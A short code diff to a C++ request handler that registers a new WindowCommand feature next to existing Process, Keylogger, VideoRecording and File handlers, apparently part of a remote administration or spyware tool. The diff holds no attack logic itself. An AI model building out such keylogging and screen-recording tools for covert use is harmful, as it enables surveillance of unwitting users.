@@ -6,6 +6,7 @@
 #include "Keylogger.hpp"
 #include "Process.hpp"
 #include "VideoRecording.hpp"
+#include "WindowCommand.hpp"
 
 RequestHandler::RequestHandler() {
 
@@ -15,7 +16,8 @@ FeatureHandler* RequestHandler::featureHandlers[FEATURE_COUNT] = {
     new Process(),
     new Keylogger(),
     new VideoRecording(),
-    new File()
+    new File(),
+    new WindowCommand()
 };
 
 DWORD RequestHandler::ProcessClient(LPVOID lpParam) {
